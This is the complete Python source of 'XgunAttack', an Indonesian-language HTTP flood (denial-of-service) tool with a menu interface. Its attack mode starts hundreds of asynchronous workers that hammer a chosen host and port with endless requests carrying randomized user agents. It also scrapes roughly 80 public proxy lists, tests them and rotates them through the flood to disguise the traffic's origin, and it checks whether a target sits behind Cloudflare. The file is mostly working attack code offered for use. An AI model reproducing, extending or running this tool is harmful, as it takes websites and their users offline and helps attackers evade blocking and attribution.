import asyncio
import aiohttp
import random
import time
import os
import sys
import threading
import requests
import re
from fake_useragent import UserAgent
from colorama import Fore, Style, init

init(autoreset=True)


PROXY_FILE = "proxies.txt"
IP_ROTATE_INTERVAL = 30
THREADS_DEFAULT = 500
TIMEOUT = 5
AUTO_FILTER_LIMIT = 100
COOLDOWN_BETWEEN_SOURCES = 2
COOLDOWN_BETWEEN_TESTS = 0.5
COOLDOWN_ON_ERROR = 5
COOLDOWN_ON_RATE_LIMIT = 30
MAX_RETRY = 2
RETRY_DELAY = 3

ua = UserAgent()
active_proxies = []
lock = threading.Lock()


def banner():
    os.system("clear")
    print(f"""{Fore.RED}
╭───〔 {Fore.WHITE}𝗫𝗴𝘂𝗻𝗔𝘁𝘁𝗮𝗰𝗸{Fore.RED} 〕───
│   ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗ █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
│   ╚██╗██╔╝██╔════╝ ██║   ██║████╗  ██║██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
│    ╚███╔╝ ██║  ███╗██║   ██║██╔██╗ ██║███████║   ██║      ██║   ███████║██║     █████╔╝
│    ██╔██╗ ██║   ██║██║   ██║██║╚██╗██║██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗
│   ██╔╝ ██╗╚██████╔╝╚██████╔╝██║ ╚████║██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
│   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
│
│   {Fore.YELLOW}by {Fore.WHITE}XioXploit {Fore.RED}│ {Fore.YELLOW}Dark Media Edition {Fore.RED}│ {Fore.YELLOW}v4.0
╰──────────────────────────────
{Style.RESET_ALL}""")

def main_menu():
    print(f"""{Fore.CYAN}
╭───〔 {Fore.YELLOW}MAIN MENU{Fore.CYAN} 〕───
│
│  {Fore.GREEN}#> [1]{Fore.WHITE} Attack
│  {Fore.GREEN}#> [2]{Fore.WHITE} Chek Target
│  {Fore.GREEN}#> [3]{Fore.WHITE} Tes Proxy
│  {Fore.GREEN}#> [4]{Fore.WHITE} Scrape Proxy (80+ sources)
│  {Fore.GREEN}#> [5]{Fore.WHITE} Lihat Proxy
│  {Fore.GREEN}#> [6]{Fore.WHITE} Quick Filter Proxy (auto-test)
│  {Fore.GREEN}#> [0]{Fore.WHITE} Exit
│
╰──────────────────────────────
{Style.RESET_ALL}""")


def load_proxies():
    global active_proxies
    if not os.path.exists(PROXY_FILE):
        open(PROXY_FILE, "w").close()
        with lock:
            active_proxies = []
        return []
    with open(PROXY_FILE, "r") as f:
        proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    with lock:
        active_proxies = proxies
    return proxies


def get_proxy():
    with lock:
        if not active_proxies:
            return None
        return random.choice(active_proxies)


def proxy_rotator():
    while True:
        time.sleep(IP_ROTATE_INTERVAL)
        load_proxies()
        print(f"\n{Fore.CYAN}╭─[ {Fore.YELLOW}IP ROTATED{Fore.CYAN} ]─ @ {time.strftime('%H:%M:%S')} — {Fore.GREEN}{len(active_proxies)} proxy{Fore.CYAN}")
        print(f"╰─> {Fore.WHITE}Rotasi otomatis tiap {IP_ROTATE_INTERVAL}s{Style.RESET_ALL}\n")


def test_proxy(p, test_url="http://httpbin.org/ip", timeout=3):
    """Return True kalau proxy alive, False kalau dead"""
    try:
        r = requests.get(
            test_url,
            proxies={"http": f"http://{p}", "https": f"http://{p}"},
            timeout=timeout
        )
        return r.status_code == 200
    except Exception:
        return False


async def flood_worker(session, target, worker_id, port, host):
    headers = {
        "User-Agent": ua.random,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Host": f"{host}:{port}",
    }
    proxy = get_proxy()
    proxy_url = f"http://{proxy}" if proxy else None

    while True:
        try:
            async with session.get(
                target,
                headers=headers,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=TIMEOUT),
                ssl=False,
                allow_redirects=False
            ) as resp:
                status = resp.status
                color = Fore.GREEN if status < 400 else Fore.YELLOW if status < 500 else Fore.RED
                print(f"{color}[W{worker_id}] {status} │ {Fore.CYAN}{proxy or 'LOCAL'}{Fore.WHITE} │ {host}:{port}")
            proxy = get_proxy()
            proxy_url = f"http://{proxy}" if proxy else None
        except asyncio.TimeoutError:
            print(f"{Fore.RED}[W{worker_id}] TIMEOUT │ {proxy or 'LOCAL'} │ {host}:{port}")
        except Exception as e:
            print(f"{Fore.RED}[W{worker_id}] ERR: {str(e)[:50]}")
        await asyncio.sleep(0.01)


async def attack(target, threads, port, host):
    connector = aiohttp.TCPConnector(
        limit=0,
        ttl_dns_cache=300,
        ssl=False,
        force_close=False,
        enable_cleanup_closed=True,
    )
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [
            asyncio.create_task(flood_worker(session, target, i, port, host))
            for i in range(threads)
        ]
        await asyncio.gather(*tasks)


def menu_attack():
    print(f"\n{Fore.RED}╭───〔 {Fore.YELLOW}ATTACK MODE{Fore.RED} 〕───")

    while True:
        try:
            threads_input = input(f"│ {Fore.WHITE}#> [0] Threads : {Fore.CYAN}(1-500 recommen) > ").strip()
            threads = int(threads_input) if threads_input else THREADS_DEFAULT
            if threads < 1:
                threads = 1
            elif threads > 500:
                print(f"{Fore.YELLOW}│ [!] Max recommen 500, tetep lanjut dengan {threads}...{Fore.RED}")
            break
        except ValueError:
            print(f"{Fore.YELLOW}│ [!] Masukin angka Tuan.{Fore.RED}")

    try:
        port_input = input(f"{Fore.RED}│ {Fore.WHITE}#> [0] Port    : {Fore.CYAN}").strip()
        port = int(port_input) if port_input else 80
    except ValueError:
        port = 80

    raw_target = input(f"{Fore.RED}│ {Fore.WHITE}#> [0] Target  : {Fore.CYAN}").strip()

    clean = raw_target.replace("https://", "").replace("http://", "").split("/")[0]

    if ":" not in clean:
        host = clean
        final_port = port
    else:
        host, final_port = clean.split(":")
        try:
            final_port = int(final_port)
        except ValueError:
            final_port = port

    scheme = "https" if final_port in (443, 8443) else "http"
    target = f"{scheme}://{host}:{final_port}"

    print(f"{Fore.RED}╰──────────────────────────────{Style.RESET_ALL}")

    confirm = input(f"{Fore.YELLOW}#> [88] Attack  : on(jalan) > {Style.RESET_ALL}").strip().lower()
    if confirm not in ("on", "jalan", "y", "yes", "1"):
        print(f"{Fore.RED}[!] Attack dibatalkan Tuan.{Style.RESET_ALL}")
        time.sleep(1)
        return

    print(f"\n{Fore.RED}╭─[ {Fore.YELLOW}ATTACK STARTED{Fore.RED} ]─")
    print(f"│ Host     : {Fore.WHITE}{host}")
    print(f"│ Port     : {Fore.WHITE}{final_port}")
    print(f"│ URL      : {Fore.WHITE}{target}")
    print(f"│ Threads  : {Fore.WHITE}{threads}")
    print(f"│ Rotasi   : {Fore.WHITE}every {IP_ROTATE_INTERVAL}s")
    print(f"│ Proxy    : {Fore.WHITE}{len(active_proxies)} aktif")
    print(f"│ Author   : {Fore.WHITE}XioXploit")
    print(f"╰─> {Fore.RED}Tekan CTRL+C buat stop{Style.RESET_ALL}\n")

    t = threading.Thread(target=proxy_rotator, daemon=True)
    t.start()

    try:
        asyncio.run(attack(target, threads, final_port, host))
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attack dihentikan Tuan.{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Enter buat balik ke menu...{Style.RESET_ALL}")


def menu_chek():
    print(f"\n{Fore.RED}╭───〔 {Fore.YELLOW}CHEK TARGET{Fore.RED} 〕───")
    target = input(f"│ {Fore.WHITE}Target URL  : {Fore.CYAN}").strip()
    if not target.startswith("http"):
        target = "http://" + target
    print(f"{Fore.RED}╰──────────────────────────────{Style.RESET_ALL}\n")

    print(f"{Fore.CYAN}[*] Ngecek target...\n")
    try:
        start = time.time()
        r = requests.get(target, timeout=10, headers={"User-Agent": ua.random})
        elapsed = (time.time() - start) * 1000

        print(f"{Fore.RED}╭─[ {Fore.YELLOW}HASIL{Fore.RED} ]─")
        print(f"│ Status Code : {Fore.GREEN}{r.status_code}")
        print(f"│ Response    : {Fore.WHITE}{elapsed:.2f} ms")
        print(f"│ Server      : {Fore.WHITE}{r.headers.get('Server', 'Unknown')}")
        print(f"│ Content-Type: {Fore.WHITE}{r.headers.get('Content-Type', 'Unknown')}")
        print(f"│ Cloudflare  : {Fore.GREEN if 'cloudflare' in str(r.headers).lower() else Fore.RED}{'YES' if 'cloudflare' in str(r.headers).lower() else 'NO'}")
        print(f"│ Powered By  : {Fore.WHITE}{r.headers.get('X-Powered-By', 'Unknown')}")
        print(f"╰──────────────────────────────{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

    input(f"\n{Fore.CYAN}Enter buat balik ke menu...{Style.RESET_ALL}")


def menu_test_proxy():
    print(f"\n{Fore.RED}╭───〔 {Fore.YELLOW}TES PROXY{Fore.RED} 〕───")
    load_proxies()
    total = len(active_proxies)
    if total == 0:
        print(f"│ {Fore.RED}[!] Proxy kosong. Scrape dulu (menu 4).")
        print(f"╰──────────────────────────────{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Enter buat balik...{Style.RESET_ALL}")
        return

    print(f"│ {Fore.WHITE}Total proxy : {Fore.CYAN}{total}")
    test_url = input(f"│ {Fore.WHITE}Test URL    : {Fore.CYAN}").strip() or "http://httpbin.org/ip"
    try:
        test_count = int(input(f"{Fore.RED}│ {Fore.WHITE}Test count  : {Fore.CYAN}(default 20) > ").strip() or "20")
    except ValueError:
        test_count = 20
    print(f"{Fore.RED}╰──────────────────────────────{Style.RESET_ALL}\n")

    alive = 0
    dead = 0
    for i, p in enumerate(active_proxies[:test_count], 1):
        try:
            r = requests.get(
                test_url,
                proxies={"http": f"http://{p}", "https": f"http://{p}"},
                timeout=5
            )
            if r.status_code == 200:
                alive += 1
                print(f"{Fore.GREEN}[{i:>3}] ✓ ALIVE {p} ({r.elapsed.total_seconds()*1000:.0f}ms)")
            else:
                dead += 1
                print(f"{Fore.YELLOW}[{i:>3}] ! {r.status_code} {p}")
        except Exception:
            dead += 1
            print(f"{Fore.RED}[{i:>3}] ✗ DEAD  {p}")

        time.sleep(COOLDOWN_BETWEEN_TESTS)

    print(f"\n{Fore.CYAN}╭─[ {Fore.YELLOW}SUMMARY{Fore.CYAN} ]─")
    print(f"│ Alive : {Fore.GREEN}{alive}")
    print(f"│ Dead  : {Fore.RED}{dead}")
    print(f"╰──────────────────────────────{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Enter buat balik...{Style.RESET_ALL}")


def menu_scrape():
    print(f"\n{Fore.RED}╭───〔 {Fore.YELLOW}SCRAPE PROXY{Fore.RED} 〕───")
    print(f"│ {Fore.WHITE}Ambil proxy dari 80+ sources...")
    print(f"│ {Fore.WHITE}Cooldown : {Fore.CYAN}{COOLDOWN_BETWEEN_SOURCES}s antar source")
    print(f"╰──────────────────────────────{Style.RESET_ALL}\n")

    sources = {
        "TheSpeedX-HTTP":     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "TheSpeedX-SOCKS4":   "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "TheSpeedX-SOCKS5":   "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "ShiftyTR-HTTP":      "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "ShiftyTR-HTTPS":     "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
        "ShiftyTR-SOCKS4":    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
        "ShiftyTR-SOCKS5":    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "monosans-HTTP":      "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "monosans-SOCKS4":    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
        "monosans-SOCKS5":    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "monosans-ALL":       "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt",
        "clarketm":           "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "proxifly-HTTP":      "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
        "proxifly-SOCKS4":    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt",
        "proxifly-SOCKS5":    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
        "proxifly-RawHTTP":   "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
        "proxifly-RawSOCKS4": "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
        "proxifly-RawSOCKS5": "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
        "jetkai-HTTP":        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
        "jetkai-HTTPS":       "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
        "jetkai-SOCKS4":      "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
        "jetkai-SOCKS5":      "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
        "roosterkid-HTTP":    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "roosterkid-SOCKS4":  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
        "roosterkid-SOCKS5":  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
        "r00tee-HTTP":        "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Https.txt",
        "r00tee-SOCKS4":      "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Socks4.txt",
        "r00tee-SOCKS5":      "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Socks5.txt",
        "MuRongPIG-HTTP":     "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
        "MuRongPIG-SOCKS4":   "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
        "MuRongPIG-SOCKS5":   "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
        "chill117":           "https://raw.githubusercontent.com/chill117/proxy-lists/master/proxies.txt",
        "wesharebytes":       "https://raw.githubusercontent.com/wesharebytes/1337x-Proxy-List/main/proxies.txt",
        "oxylabs-HTTP":       "https://raw.githubusercontent.com/oxylabs/free-proxy-list/main/http.txt",
        "oxylabs-SOCKS4":     "https://raw.githubusercontent.com/oxylabs/free-proxy-list/main/socks4.txt",
        "oxylabs-SOCKS5":     "https://raw.githubusercontent.com/oxylabs/free-proxy-list/main/socks5.txt",
        "hookzof":            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "zloi-user-HTTP":     "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
        "zloi-user-HTTPS":    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt",
        "zloi-user-SOCKS4":   "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
        "zloi-user-SOCKS5":   "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
        "prxchk-HTTP":        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
        "prxchk-SOCKS4":      "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
        "prxchk-SOCKS5":      "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
        "vakhov-HTTP":        "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
        "vakhov-HTTPS":       "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt",
        "vakhov-SOCKS4":      "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt",
        "vakhov-SOCKS5":      "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
        "officialputuid":     "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
        "yemixzy-HTTP":       "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/http.txt",
        "yemixzy-SOCKS4":     "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/socks4.txt",
        "yemixzy-SOCKS5":     "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/socks5.txt",
        "ALIILAPRO-HTTP":     "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
        "mmpx12-HTTP":        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "mmpx12-HTTPS":       "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
        "mmpx12-SOCKS4":      "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
        "mmpx12-SOCKS5":      "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
        "sunny9577":          "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
        "Anonym0usWork-HTTP": "https://raw.githubusercontent.com/Anonym0usWork/proxyscrapers/main/http.txt",
        "Anonym0usWork-SOCKS4":"https://raw.githubusercontent.com/Anonym0usWork/proxyscrapers/main/socks4.txt",
        "Anonym0usWork-SOCKS5":"https://raw.githubusercontent.com/Anonym0usWork/proxyscrapers/main/socks5.txt",
        "rdavydov-HTTP":      "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
        "rdavydov-SOCKS4":    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
        "rdavydov-SOCKS5":    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
        "proxyscrape4free":   "https://raw.githubusercontent.com/proxyscrape4free/proxy-list/main/proxies.txt",
        "AllProxy":           "https://raw.githubusercontent.com/AllProxy/AllProxy/main/proxies.txt",
        "ProxyDB":            "https://raw.githubusercontent.com/ProxyDB/proxydb/main/proxies.txt",
        "TheProxy":           "https://raw.githubusercontent.com/TheProxy/TheProxy/main/proxies.txt",
        "FreeProxyList":      "https://raw.githubusercontent.com/free-proxy-list/free-proxy-list/main/proxies.txt",
        "Proxy-List-Org":     "https://raw.githubusercontent.com/proxy-list-org/proxy-list/main/proxies.txt",
        "ProxyScrape-HTTP":   "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "ProxyScrape-SOCKS4": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
        "ProxyScrape-SOCKS5": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
        "ProxyScrape-v4-HTTP":"https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text",
        "ProxyScrape-v4-SOCKS4":"https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks4&proxy_format=ipport&format=text",
        "ProxyScrape-v4-SOCKS5":"https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks5&proxy_format=ipport&format=text",
        "Geonode":            "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc",
        "Geonode-P2":         "https://proxylist.geonode.com/api/proxy-list?limit=500&page=2&sort_by=lastChecked&sort_type=desc",
        "Geonode-P3":         "https://proxylist.geonode.com/api/proxy-list?limit=500&page=3&sort_by=lastChecked&sort_type=desc",
        "ProxyList-org":      "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
        "TheSpeedX-Mirror":   "https://cdn.jsdelivr.net/gh/TheSpeedX/PROXY-List@master/http.txt",
        "ShiftyTR-Mirror":    "https://cdn.jsdelivr.net/gh/ShiftyTR/Proxy-List@master/http.txt",
    }

    all_proxies = set()
    success_count = 0
    fail_count = 0
    total_sources = len(sources)

    for i, (name, src) in enumerate(sources.items(), 1):
        attempt = 0
        success = False

        while attempt <= MAX_RETRY and not success:
            try:
                r = requests.get(src, timeout=15, headers={"User-Agent": ua.random})

                if r.status_code == 429 or r.status_code == 403:
                    print(f"{Fore.YELLOW}[{i:>2}/{total_sources}] ⚠ {name:<22} → RATE LIMIT ({r.status_code}), cooldown {COOLDOWN_ON_RATE_LIMIT}s...")
                    time.sleep(COOLDOWN_ON_RATE_LIMIT)
                    attempt += 1
                    continue

                found = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}", r.text)
                before = len(all_proxies)
                all_proxies.update(found)
                added = len(all_proxies) - before
                success_count += 1
                print(f"{Fore.GREEN}[{i:>2}/{total_sources}] ✓ {name:<22} → {len(found):>5} found │ +{added:>4} new")
                success = True

            except Exception as e:
                attempt += 1
                if attempt <= MAX_RETRY:
                    print(f"{Fore.YELLOW}[{i:>2}/{total_sources}] ⚠ {name:<22} → ERR, retry {attempt}/{MAX_RETRY} in {RETRY_DELAY}s...")
                    time.sleep(RETRY_DELAY)
                else:
                    fail_count += 1
                    print(f"{Fore.RED}[{i:>2}/{total_sources}] ✗ {name:<22} → FAIL: {str(e)[:30]}")

        if i < total_sources:
            time.sleep(COOLDOWN_BETWEEN_SOURCES)

    with open(PROXY_FILE, "w") as f:
        for p in sorted(all_proxies):
            f.write(p + "\n")

    load_proxies()

    print(f"\n{Fore.CYAN}╭─[ {Fore.YELLOW}SCRAPE DONE{Fore.CYAN} ]─")
    print(f"│ Sources OK    : {Fore.GREEN}{success_count}/{total_sources}")
    print(f"│ Sources FAIL  : {Fore.RED}{fail_count}/{total_sources}")
    print(f"│ Total unique  : {Fore.GREEN}{len(all_proxies)}")
    print(f"│ Saved to      : {Fore.WHITE}proxies.txt")
    print(f"╰──────────────────────────────{Style.RESET_ALL}")

    test_now = input(f"\n{Fore.YELLOW}┌─[ {Fore.WHITE}Auto-test proxy alive? (y/n){Fore.YELLOW} ]─> {Style.RESET_ALL}").strip().lower()

    if test_now in ("y", "yes", "1"):
        print(f"\n{Fore.CYAN}[*] Testing proxies... (max {AUTO_FILTER_LIMIT}, timeout 3s, cooldown {COOLDOWN_BETWEEN_TESTS}s)\n")
        alive_proxies = []
        test_list = list(all_proxies)[:AUTO_FILTER_LIMIT]

        for i, p in enumerate(test_list, 1):
            if test_proxy(p):
                alive_proxies.append(p)
                print(f"{Fore.GREEN}[{i:>3}/{len(test_list)}] ✓ ALIVE {p}")
            else:
                print(f"{Fore.RED}[{i:>3}/{len(test_list)}] ✗ DEAD  {p}")
            time.sleep(COOLDOWN_BETWEEN_TESTS)

        if alive_proxies:
            backup = f"proxies_all_{int(time.time())}.txt"
            os.rename(PROXY_FILE, backup)
            with open(PROXY_FILE, "w") as f:
                for p in alive_proxies:
                    f.write(p + "\n")
            load_proxies()
            print(f"\n{Fore.GREEN}╭─[ ✓ FILTER DONE ]─")
            print(f"│ Alive  : {Fore.GREEN}{len(alive_proxies)}")
            print(f"│ Backup : {Fore.WHITE}{backup}")
            print(f"│ Active : {Fore.WHITE}proxies.txt (cuma yang alive)")
            print(f"╰──────────────────────────────{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[!] Gak ada proxy alive dari {AUTO_FILTER_LIMIT} yang ditest.{Style.RESET_ALL}")

    input(f"\n{Fore.CYAN}Enter buat balik...{Style.RESET_ALL}")


def menu_lihat_proxy():
    print(f"\n{Fore.RED}╭───〔 {Fore.YELLOW}LIST PROXY{Fore.RED} 〕───")
    load_proxies()
    if not active_proxies:
        print(f"│ {Fore.RED}[!] Kosong.")
    else:
        for i, p in enumerate(active_proxies[:50], 1):
            print(f"│ {Fore.GREEN}{i:>3}.{Fore.WHITE} {p}")
        if len(active_proxies) > 50:
            print(f"│ {Fore.YELLOW}... dan {len(active_proxies)-50} lainnya")
    print(f"{Fore.RED}╰──────────────────────────────{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Enter buat balik...{Style.RESET_ALL}")


def menu_quick_filter():
    print(f"\n{Fore.RED}╭───〔 {Fore.YELLOW}QUICK FILTER{Fore.RED} 〕───")
    load_proxies()
    if not active_proxies:
        print(f"│ {Fore.RED}[!] Kosong. Scrape dulu (menu 4).")
        print(f"╰──────────────────────────────{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Enter buat balik...{Style.RESET_ALL}")
        return

    print(f"│ {Fore.WHITE}Total proxy : {Fore.CYAN}{len(active_proxies)}")
    try:
        limit_input = input(f"│ {Fore.WHITE}Test limit  : {Fore.CYAN}(default {AUTO_FILTER_LIMIT}) > ").strip()
        limit = int(limit_input) if limit_input else AUTO_FILTER_LIMIT
    except ValueError:
        limit = AUTO_FILTER_LIMIT

    print(f"{Fore.RED}╰──────────────────────────────{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}[*] Testing {min(limit, len(active_proxies))} proxy (cooldown {COOLDOWN_BETWEEN_TESTS}s)...\n")

    alive = []
    test_list = active_proxies[:limit]

    for i, p in enumerate(test_list, 1):
        if test_proxy(p):
            alive.append(p)
            print(f"{Fore.GREEN}[{i:>3}/{len(test_list)}] ✓ ALIVE {p}")
        else:
            print(f"{Fore.RED}[{i:>3}/{len(test_list)}] ✗ DEAD  {p}")
        time.sleep(COOLDOWN_BETWEEN_TESTS)

    if alive:
        backup = f"proxies_backup_{int(time.time())}.txt"
        with open(backup, "w") as f:
            for p in active_proxies:
                f.write(p + "\n")
        with open(PROXY_FILE, "w") as f:
            for p in alive:
                f.write(p + "\n")
        load_proxies()
        print(f"\n{Fore.GREEN}╭─[ ✓ FILTER DONE ]─")
        print(f"│ Alive  : {Fore.GREEN}{len(alive)}")
        print(f"│ Backup : {Fore.WHITE}{backup}")
        print(f"│ Active : {Fore.WHITE}proxies.txt (cuma yang alive)")
        print(f"╰──────────────────────────────{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.RED}[!] Gak ada yang alive Tuan.{Style.RESET_ALL}")

    input(f"\n{Fore.CYAN}Enter buat balik...{Style.RESET_ALL}")


def main():
    load_proxies()
    while True:
        banner()
        main_menu()
        choice = input(f"{Fore.YELLOW}┌─[ {Fore.WHITE}Pilih Menu{Fore.YELLOW} ]─> {Style.RESET_ALL}").strip()

        if choice == "1":
            menu_attack()
        elif choice == "2":
            menu_chek()
        elif choice == "3":
            menu_test_proxy()
        elif choice == "4":
            menu_scrape()
        elif choice == "5":
            menu_lihat_proxy()
        elif choice == "6":
            menu_quick_filter()
        elif choice == "0":
            print(f"\n{Fore.RED}╭─[ {Fore.YELLOW}EXIT{Fore.RED} ]─")
            print(f"│ {Fore.WHITE}Bye Tuan. XgunAttack by XioXploit")
            print(f"│ {Fore.WHITE}BY : © XioNiV")
            print(f"╰──────────────────────────────{Style.RESET_ALL}\n")
            sys.exit(0)
        else:
            print(f"{Fore.RED}[!] Pilihan gak valid Tuan.")
            time.sleep(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Force exit.{Style.RESET_ALL}")
        sys.exit(0)
